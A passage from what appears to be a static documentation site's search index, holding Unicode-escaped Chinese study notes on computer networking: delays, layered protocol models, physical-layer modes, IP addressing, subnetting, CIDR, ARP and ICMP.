\u4F20\u8F93\u65F6\u5EF6",slug:"_3-\u4F20\u8F93\u65F6\u5EF6",content:`\u4E3B\u673A\u6216\u8DEF\u7531\u5668\u4F20\u8F93\u6570\u636E\u5E27\u6240\u9700\u8981\u7684\u65F6\u95F4\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/dcdbb96c-9077-4121-aeb8-743e54ac02a4.png" width="150px">
\u5176\u4E2D l \u8868\u793A\u6570\u636E\u5E27\u7684\u957F\u5EA6\uFF0Cv \u8868\u793A\u4F20\u8F93\u901F\u7387\u3002`},{header:"4. \u4F20\u64AD\u65F6\u5EF6",slug:"_4-\u4F20\u64AD\u65F6\u5EF6",content:`\u7535\u78C1\u6CE2\u5728\u4FE1\u9053\u4E2D\u4F20\u64AD\u6240\u9700\u8981\u82B1\u8D39\u7684\u65F6\u95F4\uFF0C\u7535\u78C1\u6CE2\u4F20\u64AD\u7684\u901F\u5EA6\u63A5\u8FD1\u5149\u901F\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a1616dac-0e12-40b2-827d-9e3f7f0b940d.png" width="150">
\u5176\u4E2D l \u8868\u793A\u4FE1\u9053\u957F\u5EA6\uFF0Cv \u8868\u793A\u7535\u78C1\u6CE2\u5728\u4FE1\u9053\u4E0A\u7684\u4F20\u64AD\u901F\u5EA6\u3002`},{header:"\u8BA1\u7B97\u673A\u7F51\u7EDC\u4F53\u7CFB\u7ED3\u6784",slug:"\u8BA1\u7B97\u673A\u7F51\u7EDC\u4F53\u7CFB\u7ED3\u6784",content:'![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0fa6c237-a909-4e2a-a771-2c5485cd8ce0.png" width="450)'},{header:"1. \u4E94\u5C42\u534F\u8BAE",slug:"_1-\u4E94\u5C42\u534F\u8BAE",content:"\u5E94\u7528\u5C42 \uFF1A\u4E3A\u7279\u5B9A\u5E94\u7528\u7A0B\u5E8F\u63D0\u4F9B\u6570\u636E\u4F20\u8F93\u670D\u52A1\uFF0C\u4F8B\u5982 HTTP\u3001DNS \u7B49\u534F\u8BAE\u3002\u6570\u636E\u5355\u4F4D\u4E3A\u62A5\u6587\u3002 \u4F20\u8F93\u5C42 \uFF1A\u4E3A\u8FDB\u7A0B\u63D0\u4F9B\u901A\u7528\u6570\u636E\u4F20\u8F93\u670D\u52A1\u3002\u7531\u4E8E\u5E94\u7528\u5C42\u534F\u8BAE\u5F88\u591A\uFF0C\u5B9A\u4E49\u901A\u7528\u7684\u4F20\u8F93\u5C42\u534F\u8BAE\u5C31\u53EF\u4EE5\u652F\u6301\u4E0D\u65AD\u589E\u591A\u7684\u5E94\u7528\u5C42\u534F\u8BAE\u3002\u8FD0\u8F93\u5C42\u5305\u62EC\u4E24\u79CD\u534F\u8BAE\uFF1A\u4F20\u8F93\u63A7\u5236\u534F\u8BAE TCP\uFF0C\u63D0\u4F9B\u9762\u5411\u8FDE\u63A5\u3001\u53EF\u9760\u7684\u6570\u636E\u4F20\u8F93\u670D\u52A1\uFF0C\u6570\u636E\u5355\u4F4D\u4E3A\u62A5\u6587\u6BB5\uFF1B\u7528\u6237\u6570\u636E\u62A5\u534F\u8BAE UDP\uFF0C\u63D0\u4F9B\u65E0\u8FDE\u63A5\u3001\u5C3D\u6700\u5927\u52AA\u529B\u7684\u6570\u636E\u4F20\u8F93\u670D\u52A1\uFF0C\u6570\u636E\u5355\u4F4D\u4E3A\u7528\u6237\u6570\u636E\u62A5\u3002TCP \u4E3B\u8981\u63D0\u4F9B\u5B8C\u6574\u6027\u670D\u52A1\uFF0CUDP \u4E3B\u8981\u63D0\u4F9B\u53CA\u65F6\u6027\u670D\u52A1\u3002 \u7F51\u7EDC\u5C42 \uFF1A\u4E3A\u4E3B\u673A\u63D0\u4F9B\u6570\u636E\u4F20\u8F93\u670D\u52A1\u3002\u800C\u4F20\u8F93\u5C42\u534F\u8BAE\u662F\u4E3A\u4E3B\u673A\u4E2D\u7684\u8FDB\u7A0B\u63D0\u4F9B\u6570\u636E\u4F20\u8F93\u670D\u52A1\u3002\u7F51\u7EDC\u5C42\u628A\u4F20\u8F93\u5C42\u4F20\u9012\u4E0B\u6765\u7684\u62A5\u6587\u6BB5\u6216\u8005\u7528\u6237\u6570\u636E\u62A5\u5C01\u88C5\u6210\u5206\u7EC4\u3002 \u6570\u636E\u94FE\u8DEF\u5C42 \uFF1A\u7F51\u7EDC\u5C42\u9488\u5BF9\u7684\u8FD8\u662F\u4E3B\u673A\u4E4B\u95F4\u7684\u6570\u636E\u4F20\u8F93\u670D\u52A1\uFF0C\u800C\u4E3B\u673A\u4E4B\u95F4\u53EF\u4EE5\u6709\u5F88\u591A\u94FE\u8DEF\uFF0C\u94FE\u8DEF\u5C42\u534F\u8BAE\u5C31\u662F\u4E3A\u540C\u4E00\u94FE\u8DEF\u7684\u4E3B\u673A\u63D0\u4F9B\u6570\u636E\u4F20\u8F93\u670D\u52A1\u3002\u6570\u636E\u94FE\u8DEF\u5C42\u628A\u7F51\u7EDC\u5C42\u4F20\u4E0B\u6765\u7684\u5206\u7EC4\u5C01\u88C5\u6210\u5E27\u3002 \u7269\u7406\u5C42 \uFF1A\u8003\u8651\u7684\u662F\u600E\u6837\u5728\u4F20\u8F93\u5A92\u4F53\u4E0A\u4F20\u8F93\u6570\u636E\u6BD4\u7279\u6D41\uFF0C\u800C\u4E0D\u662F\u6307\u5177\u4F53\u7684\u4F20\u8F93\u5A92\u4F53\u3002\u7269\u7406\u5C42\u7684\u4F5C\u7528\u662F\u5C3D\u53EF\u80FD\u5C4F\u853D\u4F20\u8F93\u5A92\u4F53\u548C\u901A\u4FE1\u624B\u6BB5\u7684\u5DEE\u5F02\uFF0C\u4F7F\u6570\u636E\u94FE\u8DEF\u5C42\u611F\u89C9\u4E0D\u5230\u8FD9\u4E9B\u5DEE\u5F02\u3002"},{header:"2. OSI",slug:"_2-osi",content:"\u5176\u4E2D\u8868\u793A\u5C42\u548C\u4F1A\u8BDD\u5C42\u7528\u9014\u5982\u4E0B\uFF1A \u8868\u793A\u5C42 \uFF1A\u6570\u636E\u538B\u7F29\u3001\u52A0\u5BC6\u4EE5\u53CA\u6570\u636E\u63CF\u8FF0\uFF0C\u8FD9\u4F7F\u5F97\u5E94\u7528\u7A0B\u5E8F\u4E0D\u5FC5\u5173\u5FC3\u5728\u5404\u53F0\u4E3B\u673A\u4E2D\u6570\u636E\u5185\u90E8\u683C\u5F0F\u4E0D\u540C\u7684\u95EE\u9898\u3002 \u4F1A\u8BDD\u5C42 \uFF1A\u5EFA\u7ACB\u53CA\u7BA1\u7406\u4F1A\u8BDD\u3002 \u4E94\u5C42\u534F\u8BAE\u6CA1\u6709\u8868\u793A\u5C42\u548C\u4F1A\u8BDD\u5C42\uFF0C\u800C\u662F\u5C06\u8FD9\u4E9B\u529F\u80FD\u7559\u7ED9\u5E94\u7528\u7A0B\u5E8F\u5F00\u53D1\u8005\u5904\u7406\u3002"},{header:"3. TCP/IP",slug:"_3-tcp-ip",content:`\u5B83\u53EA\u6709\u56DB\u5C42\uFF0C\u76F8\u5F53\u4E8E\u4E94\u5C42\u534F\u8BAE\u4E2D\u6570\u636E\u94FE\u8DEF\u5C42\u548C\u7269\u7406\u5C42\u5408\u5E76\u4E3A\u7F51\u7EDC\u63A5\u53E3\u5C42\u3002
TCP/IP \u4F53\u7CFB\u7ED3\u6784\u4E0D\u4E25\u683C\u9075\u5FAA OSI \u5206\u5C42\u6982\u5FF5\uFF0C\u5E94\u7528\u5C42\u53EF\u80FD\u4F1A\u76F4\u63A5\u4F7F\u7528 IP \u5C42\u6216\u8005\u7F51\u7EDC\u63A5\u53E3\u5C42\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/48d79be8-085b-4862-8a9d-18402eb93b31.png" width="250)`},{header:"4. \u6570\u636E\u5728\u5404\u5C42\u4E4B\u95F4\u7684\u4F20\u9012\u8FC7\u7A0B",slug:"_4-\u6570\u636E\u5728\u5404\u5C42\u4E4B\u95F4\u7684\u4F20\u9012\u8FC7\u7A0B",content:`\u5728\u5411\u4E0B\u7684\u8FC7\u7A0B\u4E2D\uFF0C\u9700\u8981\u6DFB\u52A0\u4E0B\u5C42\u534F\u8BAE\u6240\u9700\u8981\u7684\u9996\u90E8\u6216\u8005\u5C3E\u90E8\uFF0C\u800C\u5728\u5411\u4E0A\u7684\u8FC7\u7A0B\u4E2D\u4E0D\u65AD\u62C6\u5F00\u9996\u90E8\u548C\u5C3E\u90E8\u3002
\u8DEF\u7531\u5668\u53EA\u6709\u4E0B\u9762\u4E09\u5C42\u534F\u8BAE\uFF0C\u56E0\u4E3A\u8DEF\u7531\u5668\u4F4D\u4E8E\u7F51\u7EDC\u6838\u5FC3\u4E2D\uFF0C\u4E0D\u9700\u8981\u4E3A\u8FDB\u7A0B\u6216\u8005\u5E94\u7528\u7A0B\u5E8F\u63D0\u4F9B\u670D\u52A1\uFF0C\u56E0\u6B64\u4E5F\u5C31\u4E0D\u9700\u8981\u4F20\u8F93\u5C42\u548C\u5E94\u7528\u5C42\u3002`}]},{path:"/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E7%89%A9%E7%90%86%E5%B1%82.html",title:"\u8BA1\u7B97\u673A\u7F51\u7EDC - \u7269\u7406\u5C42",pathLocale:"/",contents:[{header:"\u8BA1\u7B97\u673A\u7F51\u7EDC - \u7269\u7406\u5C42",slug:"\u8BA1\u7B97\u673A\u7F51\u7EDC-\u7269\u7406\u5C42",content:`\u8BA1\u7B97\u673A\u7F51\u7EDC - \u7269\u7406\u5C42 \u901A\u4FE1\u65B9\u5F0F
\u5E26\u901A\u8C03\u5236`},{header:"\u901A\u4FE1\u65B9\u5F0F",slug:"\u901A\u4FE1\u65B9\u5F0F",content:`\u6839\u636E\u4FE1\u606F\u5728\u4F20\u8F93\u7EBF\u4E0A\u7684\u4F20\u9001\u65B9\u5411\uFF0C\u5206\u4E3A\u4EE5\u4E0B\u4E09\u79CD\u901A\u4FE1\u65B9\u5F0F\uFF1A \u5355\u5DE5\u901A\u4FE1\uFF1A\u5355\u5411\u4F20\u8F93
\u534A\u53CC\u5DE5\u901A\u4FE1\uFF1A\u53CC\u5411\u4EA4\u66FF\u4F20\u8F93
\u5168\u53CC\u5DE5\u901A\u4FE1\uFF1A\u53CC\u5411\u540C\u65F6\u4F20\u8F93`},{header:"\u5E26\u901A\u8C03\u5236",slug:"\u5E26\u901A\u8C03\u5236",content:`\u6A21\u62DF\u4FE1\u53F7\u662F\u8FDE\u7EED\u7684\u4FE1\u53F7\uFF0C\u6570\u5B57\u4FE1\u53F7\u662F\u79BB\u6563\u7684\u4FE1\u53F7\u3002\u5E26\u901A\u8C03\u5236\u628A\u6570\u5B57\u4FE1\u53F7\u8F6C\u6362\u4E3A\u6A21\u62DF\u4FE1\u53F7\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c34f4503-f62c-4043-9dc6-3e03288657df.jpg" width="500)`}]},{path:"/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E7%9B%AE%E5%BD%95.html",title:"\u8BA1\u7B97\u673A\u7F51\u7EDC",pathLocale:"/",contents:[{header:"\u8BA1\u7B97\u673A\u7F51\u7EDC",slug:"\u8BA1\u7B97\u673A\u7F51\u7EDC",content:`\u6982\u8FF0
\u7269\u7406\u5C42
\u94FE\u8DEF\u5C42
\u7F51\u7EDC\u5C42
\u4F20\u8F93\u5C42
\u5E94\u7528\u5C42`},{header:"\u53C2\u8003\u94FE\u63A5",slug:"\u53C2\u8003\u94FE\u63A5",content:`\u8BA1\u7B97\u673A\u7F51\u7EDC, \u8C22\u5E0C\u4EC1
JamesF.Kurose, KeithW.Ross, \u5E93\u7F57\u65AF, \u7B49. \u8BA1\u7B97\u673A\u7F51\u7EDC: \u81EA\u9876\u5411\u4E0B\u65B9\u6CD5 [M]. \u673A\u68B0\u5DE5\u4E1A\u51FA\u7248\u793E, 2014.
W.RichardStevens. TCP/IP \u8BE6\u89E3. \u5377 1, \u534F\u8BAE [M]. \u673A\u68B0\u5DE5\u4E1A\u51FA\u7248\u793E, 2006.
Active vs Passive FTP Mode: Which One is More Secure?
Active and Passive FTP Transfers Defined - KB Article #1138
Traceroute
ping
How DHCP works and DHCP Interview Questions and Answers
What is process of DORA in DHCP?
What is DHCP Server ?
Tackling emissions targets in Tokyo
What does my ISP know when I use Tor?
Technology-Computer Networking[1]-Computer Networks and the Internet
P2P \u7F51\u7EDC\u6982\u8FF0.
Circuit Switching (a) Circuit switching. (b) Packet switching.`}]},{path:"/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E7%BD%91%E7%BB%9C%E5%B1%82.html",title:"\u8BA1\u7B97\u673A\u7F51\u7EDC - \u7F51\u7EDC\u5C42",pathLocale:"/",contents:[{header:"\u8BA1\u7B97\u673A\u7F51\u7EDC - \u7F51\u7EDC\u5C42",slug:"\u8BA1\u7B97\u673A\u7F51\u7EDC-\u7F51\u7EDC\u5C42",content:`\u8BA1\u7B97\u673A\u7F51\u7EDC - \u7F51\u7EDC\u5C42 \u6982\u8FF0
IP \u6570\u636E\u62A5\u683C\u5F0F
IP \u5730\u5740\u7F16\u5740\u65B9\u5F0F 1. \u5206\u7C7B
2. \u5B50\u7F51\u5212\u5206
3. \u65E0\u5206\u7C7B \u5730\u5740\u89E3\u6790\u534F\u8BAE ARP
\u7F51\u9645\u63A7\u5236\u62A5\u6587\u534F\u8BAE ICMP 1. Ping
2. Traceroute \u865A\u62DF\u4E13\u7528\u7F51 VPN
\u7F51\u7EDC\u5730\u5740\u8F6C\u6362 NAT
\u8DEF\u7531\u5668\u7684\u7ED3\u6784
\u8DEF\u7531\u5668\u5206\u7EC4\u8F6C\u53D1\u6D41\u7A0B
\u8DEF\u7531\u9009\u62E9\u534F\u8BAE 1. \u5185\u90E8\u7F51\u5173\u534F\u8BAE RIP
2. \u5185\u90E8\u7F51\u5173\u534F\u8BAE OSPF
3. \u5916\u90E8\u7F51\u5173\u534F\u8BAE BGP`},{header:"\u6982\u8FF0",slug:"\u6982\u8FF0",content:`\u56E0\u4E3A\u7F51\u7EDC\u5C42\u662F\u6574\u4E2A\u4E92\u8054\u7F51\u7684\u6838\u5FC3\uFF0C\u56E0\u6B64\u5E94\u5F53\u8BA9\u7F51\u7EDC\u5C42\u5C3D\u53EF\u80FD\u7B80\u5355\u3002\u7F51\u7EDC\u5C42\u5411\u4E0A\u53EA\u63D0\u4F9B\u7B80\u5355\u7075\u6D3B\u7684\u3001\u65E0\u8FDE\u63A5\u7684\u3001\u5C3D\u6700\u5927\u52AA\u529B\u4EA4\u4E92\u7684\u6570\u636E\u62A5\u670D\u52A1\u3002
\u4F7F\u7528 IP \u534F\u8BAE\uFF0C\u53EF\u4EE5\u628A\u5F02\u6784\u7684\u7269\u7406\u7F51\u7EDC\u8FDE\u63A5\u8D77\u6765\uFF0C\u4F7F\u5F97\u5728\u7F51\u7EDC\u5C42\u770B\u8D77\u6765\u597D\u50CF\u662F\u4E00\u4E2A\u7EDF\u4E00\u7684\u7F51\u7EDC\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/8d779ab7-ffcc-47c6-90ec-ede8260b2368.png" width="800)
\u4E0E IP \u534F\u8BAE\u914D\u5957\u4F7F\u7528\u7684\u8FD8\u6709\u4E09\u4E2A\u534F\u8BAE\uFF1A \u5730\u5740\u89E3\u6790\u534F\u8BAE ARP\uFF08Address Resolution Protocol\uFF09
\u7F51\u9645\u63A7\u5236\u62A5\u6587\u534F\u8BAE ICMP\uFF08Internet Control Message Protocol\uFF09
\u7F51\u9645\u7EC4\u7BA1\u7406\u534F\u8BAE IGMP\uFF08Internet Group Management Protocol\uFF09`},{header:"IP \u6570\u636E\u62A5\u683C\u5F0F",slug:"ip-\u6570\u636E\u62A5\u683C\u5F0F",content:'![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/85c05fb1-5546-4c50-9221-21f231cdc8c5.jpg" width="700) \u7248\u672C : \u6709 4\uFF08IPv4\uFF09\u548C 6\uFF08IPv6\uFF09\u4E24\u4E2A\u503C\uFF1B \u9996\u90E8\u957F\u5EA6 : \u5360 4 \u4F4D\uFF0C\u56E0\u6B64\u6700\u5927\u503C\u4E3A 15\u3002\u503C\u4E3A 1 \u8868\u793A\u7684\u662F 1 \u4E2A 32 \u4F4D\u5B57\u7684\u957F\u5EA6\uFF0C\u4E5F\u5C31\u662F 4 \u5B57\u8282\u3002\u56E0\u4E3A\u56FA\u5B9A\u90E8\u5206\u957F\u5EA6\u4E3A 20 \u5B57\u8282\uFF0C\u56E0\u6B64\u8BE5\u503C\u6700\u5C0F\u4E3A 5\u3002\u5982\u679C\u53EF\u9009\u5B57\u6BB5\u7684\u957F\u5EA6\u4E0D\u662F 4 \u5B57\u8282\u7684\u6574\u6570\u500D\uFF0C\u5C31\u7528\u5C3E\u90E8\u7684\u586B\u5145\u90E8\u5206\u6765\u586B\u5145\u3002 \u533A\u5206\u670D\u52A1 : \u7528\u6765\u83B7\u5F97\u66F4\u597D\u7684\u670D\u52A1\uFF0C\u4E00\u822C\u60C5\u51B5\u4E0B\u4E0D\u4F7F\u7528\u3002 \u603B\u957F\u5EA6 : \u5305\u62EC\u9996\u90E8\u957F\u5EA6\u548C\u6570\u636E\u90E8\u5206\u957F\u5EA6\u3002 \u751F\u5B58\u65F6\u95F4 \uFF1ATTL\uFF0C\u5B83\u7684\u5B58\u5728\u662F\u4E3A\u4E86\u9632\u6B62\u65E0\u6CD5\u4EA4\u4ED8\u7684\u6570\u636E\u62A5\u5728\u4E92\u8054\u7F51\u4E2D\u4E0D\u65AD\u515C\u5708\u5B50\u3002\u4EE5\u8DEF\u7531\u5668\u8DF3\u6570\u4E3A\u5355\u4F4D\uFF0C\u5F53 TTL \u4E3A 0 \u65F6\u5C31\u4E22\u5F03\u6570\u636E\u62A5\u3002 \u534F\u8BAE \uFF1A\u6307\u51FA\u643A\u5E26\u7684\u6570\u636E\u5E94\u8BE5\u4E0A\u4EA4\u7ED9\u54EA\u4E2A\u534F\u8BAE\u8FDB\u884C\u5904\u7406\uFF0C\u4F8B\u5982 ICMP\u3001TCP\u3001UDP \u7B49\u3002 \u9996\u90E8\u68C0\u9A8C\u548C \uFF1A\u56E0\u4E3A\u6570\u636E\u62A5\u6BCF\u7ECF\u8FC7\u4E00\u4E2A\u8DEF\u7531\u5668\uFF0C\u90FD\u8981\u91CD\u65B0\u8BA1\u7B97\u68C0\u9A8C\u548C\uFF0C\u56E0\u6B64\u68C0\u9A8C\u548C\u4E0D\u5305\u542B\u6570\u636E\u90E8\u5206\u53EF\u4EE5\u51CF\u5C11\u8BA1\u7B97\u7684\u5DE5\u4F5C\u91CF\u3002 \u6807\u8BC6 : \u5728\u6570\u636E\u62A5\u957F\u5EA6\u8FC7\u957F\u4ECE\u800C\u53D1\u751F\u5206\u7247\u7684\u60C5\u51B5\u4E0B\uFF0C\u76F8\u540C\u6570\u636E\u62A5\u7684\u4E0D\u540C\u5206\u7247\u5177\u6709\u76F8\u540C\u7684\u6807\u8BC6\u7B26\u3002 \u7247\u504F\u79FB : \u548C\u6807\u8BC6\u7B26\u4E00\u8D77\uFF0C\u7528\u4E8E\u53D1\u751F\u5206\u7247\u7684\u60C5\u51B5\u3002\u7247\u504F\u79FB\u7684\u5355\u4F4D\u4E3A 8 \u5B57\u8282\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/23ba890e-e11c-45e2-a20c-64d217f83430.png" width="700)'},{header:"IP \u5730\u5740\u7F16\u5740\u65B9\u5F0F",slug:"ip-\u5730\u5740\u7F16\u5740\u65B9\u5F0F",content:`IP \u5730\u5740\u7684\u7F16\u5740\u65B9\u5F0F\u7ECF\u5386\u4E86\u4E09\u4E2A\u5386\u53F2\u9636\u6BB5\uFF1A \u5206\u7C7B
\u5B50\u7F51\u5212\u5206
\u65E0\u5206\u7C7B`},{header:"1. \u5206\u7C7B",slug:"_1-\u5206\u7C7B",content:`\u7531\u4E24\u90E8\u5206\u7EC4\u6210\uFF0C\u7F51\u7EDC\u53F7\u548C\u4E3B\u673A\u53F7\uFF0C\u5176\u4E2D\u4E0D\u540C\u5206\u7C7B\u5177\u6709\u4E0D\u540C\u7684\u7F51\u7EDC\u53F7\u957F\u5EA6\uFF0C\u5E76\u4E14\u662F\u56FA\u5B9A\u7684\u3002
IP \u5730\u5740 ::= {< \u7F51\u7EDC\u53F7 >, < \u4E3B\u673A\u53F7 >}
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/cbf50eb8-22b4-4528-a2e7-d187143d57f7.png" width="500)`},{header:"2. \u5B50\u7F51\u5212\u5206",slug:"_2-\u5B50\u7F51\u5212\u5206",content:`\u901A\u8FC7\u5728\u4E3B\u673A\u53F7\u5B57\u6BB5\u4E2D\u62FF\u4E00\u90E8\u5206\u4F5C\u4E3A\u5B50\u7F51\u53F7\uFF0C\u628A\u4E24\u7EA7 IP \u5730\u5740\u5212\u5206\u4E3A\u4E09\u7EA7 IP \u5730\u5740\u3002
IP \u5730\u5740 ::= {< \u7F51\u7EDC\u53F7 >, < \u5B50\u7F51\u53F7 >, < \u4E3B\u673A\u53F7 >}
\u8981\u4F7F\u7528\u5B50\u7F51\uFF0C\u5FC5\u987B\u914D\u7F6E\u5B50\u7F51\u63A9\u7801\u3002\u4E00\u4E2A B \u7C7B\u5730\u5740\u7684\u9ED8\u8BA4\u5B50\u7F51\u63A9\u7801\u4E3A 255.255.0.0\uFF0C\u5982\u679C B \u7C7B\u5730\u5740\u7684\u5B50\u7F51\u5360\u4E24\u4E2A\u6BD4\u7279\uFF0C\u90A3\u4E48\u5B50\u7F51\u63A9\u7801\u4E3A 11111111 11111111 11000000 00000000\uFF0C\u4E5F\u5C31\u662F 255.255.192.0\u3002
\u6CE8\u610F\uFF0C\u5916\u90E8\u7F51\u7EDC\u770B\u4E0D\u5230\u5B50\u7F51\u7684\u5B58\u5728\u3002`},{header:"3. \u65E0\u5206\u7C7B",slug:"_3-\u65E0\u5206\u7C7B",content:`\u65E0\u5206\u7C7B\u7F16\u5740 CIDR \u6D88\u9664\u4E86\u4F20\u7EDF A \u7C7B\u3001B \u7C7B\u548C C \u7C7B\u5730\u5740\u4EE5\u53CA\u5212\u5206\u5B50\u7F51\u7684\u6982\u5FF5\uFF0C\u4F7F\u7528\u7F51\u7EDC\u524D\u7F00\u548C\u4E3B\u673A\u53F7\u6765\u5BF9 IP \u5730\u5740\u8FDB\u884C\u7F16\u7801\uFF0C\u7F51\u7EDC\u524D\u7F00\u7684\u957F\u5EA6\u53EF\u4EE5\u6839\u636E\u9700\u8981\u53D8\u5316\u3002
IP \u5730\u5740 ::= {< \u7F51\u7EDC\u524D\u7F00\u53F7 >, < \u4E3B\u673A\u53F7 >}
CIDR \u7684\u8BB0\u6CD5\u4E0A\u91C7\u7528\u5728 IP \u5730\u5740\u540E\u9762\u52A0\u4E0A\u7F51\u7EDC\u524D\u7F00\u957F\u5EA6\u7684\u65B9\u6CD5\uFF0C\u4F8B\u5982 128.14.35.7/20 \u8868\u793A\u524D 20 \u4F4D\u4E3A\u7F51\u7EDC\u524D\u7F00\u3002
CIDR \u7684\u5730\u5740\u63A9\u7801\u53EF\u4EE5\u7EE7\u7EED\u79F0\u4E3A\u5B50\u7F51\u63A9\u7801\uFF0C\u5B50\u7F51\u63A9\u7801\u9996 1 \u957F\u5EA6\u4E3A\u7F51\u7EDC\u524D\u7F00\u7684\u957F\u5EA6\u3002
\u4E00\u4E2A CIDR \u5730\u5740\u5757\u4E2D\u6709\u5F88\u591A\u5730\u5740\uFF0C\u4E00\u4E2A CIDR \u8868\u793A\u7684\u7F51\u7EDC\u5C31\u53EF\u4EE5\u8868\u793A\u539F\u6765\u7684\u5F88\u591A\u4E2A\u7F51\u7EDC\uFF0C\u5E76\u4E14\u5728\u8DEF\u7531\u8868\u4E2D\u53EA\u9700\u8981\u4E00\u4E2A\u8DEF\u7531\u5C31\u53EF\u4EE5\u4EE3\u66FF\u539F\u6765\u7684\u591A\u4E2A\u8DEF\u7531\uFF0C\u51CF\u5C11\u4E86\u8DEF\u7531\u8868\u9879\u7684\u6570\u91CF\u3002\u628A\u8FD9\u79CD\u901A\u8FC7\u4F7F\u7528\u7F51\u7EDC\u524D\u7F00\u6765\u51CF\u5C11\u8DEF\u7531\u8868\u9879\u7684\u65B9\u5F0F\u79F0\u4E3A\u8DEF\u7531\u805A\u5408\uFF0C\u4E5F\u79F0\u4E3A \u6784\u6210\u8D85\u7F51 \u3002
\u5728\u8DEF\u7531\u8868\u4E2D\u7684\u9879\u76EE\u7531\u201C\u7F51\u7EDC\u524D\u7F00\u201D\u548C\u201C\u4E0B\u4E00\u8DF3\u5730\u5740\u201D\u7EC4\u6210\uFF0C\u5728\u67E5\u627E\u65F6\u53EF\u80FD\u4F1A\u5F97\u5230\u4E0D\u6B62\u4E00\u4E2A\u5339\u914D\u7ED3\u679C\uFF0C\u5E94\u5F53\u91C7\u7528\u6700\u957F\u524D\u7F00\u5339\u914D\u6765\u786E\u5B9A\u5E94\u8BE5\u5339\u914D\u54EA\u4E00\u4E2A\u3002`},{header:"\u5730\u5740\u89E3\u6790\u534F\u8BAE ARP",slug:"\u5730\u5740\u89E3\u6790\u534F\u8BAE-arp",content:`\u7F51\u7EDC\u5C42\u5B9E\u73B0\u4E3B\u673A\u4E4B\u95F4\u7684\u901A\u4FE1\uFF0C\u800C\u94FE\u8DEF\u5C42\u5B9E\u73B0\u5177\u4F53\u6BCF\u6BB5\u94FE\u8DEF\u4E4B\u95F4\u7684\u901A\u4FE1\u3002\u56E0\u6B64\u5728\u901A\u4FE1\u8FC7\u7A0B\u4E2D\uFF0CIP \u6570\u636E\u62A5\u7684\u6E90\u5730\u5740\u548C\u76EE\u7684\u5730\u5740\u59CB\u7EC8\u4E0D\u53D8\uFF0C\u800C MAC \u5730\u5740\u968F\u7740\u94FE\u8DEF\u7684\u6539\u53D8\u800C\u6539\u53D8\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/66192382-558b-4b05-a35d-ac4a2b1a9811.jpg" width="700)
ARP \u5B9E\u73B0\u7531 IP \u5730\u5740\u5F97\u5230 MAC \u5730\u5740\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/b9d79a5a-e7af-499b-b989-f10483e71b8b.jpg" width="500)
\u6BCF\u4E2A\u4E3B\u673A\u90FD\u6709\u4E00\u4E2A ARP \u9AD8\u901F\u7F13\u5B58\uFF0C\u91CC\u9762\u6709\u672C\u5C40\u57DF\u7F51\u4E0A\u7684\u5404\u4E3B\u673A\u548C\u8DEF\u7531\u5668\u7684 IP \u5730\u5740\u5230 MAC \u5730\u5740\u7684\u6620\u5C04\u8868\u3002
\u5982\u679C\u4E3B\u673A A \u77E5\u9053\u4E3B\u673A B \u7684 IP \u5730\u5740\uFF0C\u4F46\u662F ARP \u9AD8\u901F\u7F13\u5B58\u4E2D\u6CA1\u6709\u8BE5 IP \u5730\u5740\u5230 MAC \u5730\u5740\u7684\u6620\u5C04\uFF0C\u6B64\u65F6\u4E3B\u673A A \u901A\u8FC7\u5E7F\u64AD\u7684\u65B9\u5F0F\u53D1\u9001 ARP \u8BF7\u6C42\u5206\u7EC4\uFF0C\u4E3B\u673A B \u6536\u5230\u8BE5\u8BF7\u6C42\u540E\u4F1A\u53D1\u9001 ARP \u54CD\u5E94\u5206\u7EC4\u7ED9\u4E3B\u673A A \u544A\u77E5\u5176 MAC \u5730\u5740\uFF0C\u968F\u540E\u4E3B\u673A A \u5411\u5176\u9AD8\u901F\u7F13\u5B58\u4E2D\u5199\u5165\u4E3B\u673A B \u7684 IP \u5730\u5740\u5230 MAC \u5730\u5740\u7684\u6620\u5C04\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/8006a450-6c2f-498c-a928-c927f758b1d0.png" width="700)`},{header:"\u7F51\u9645\u63A7\u5236\u62A5\u6587\u534F\u8BAE ICMP",slug:"\u7F51\u9645\u63A7\u5236\u62A5\u6587\u534F\u8BAE-icmp",content:`ICMP \u662F\u4E3A\u4E86\u66F4\u6709\u6548\u5730\u8F6C\u53D1 IP \u6570\u636E\u62A5\u548C\u63D0\u9AD8\u4EA4\u4ED8\u6210\u529F\u7684\u673A\u4F1A\u3002\u5B83\u5C01\u88C5\u5728 IP \u6570\u636E\u62A5\u4E2D\uFF0C\u4F46\u662F\u4E0D\u5C5E\u4E8E\u9AD8\u5C42\u534F\u8BAE\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e3124763-f75e-46c3-ba82-341e6c98d862.jpg" width="500)
ICMP \u62A5\u6587\u5206\u4E3A\u5DEE\u9519\u62A5\u544A\u62A5\u6587\u548C\u8BE2\u95EE\u62A5\u6587\u3002
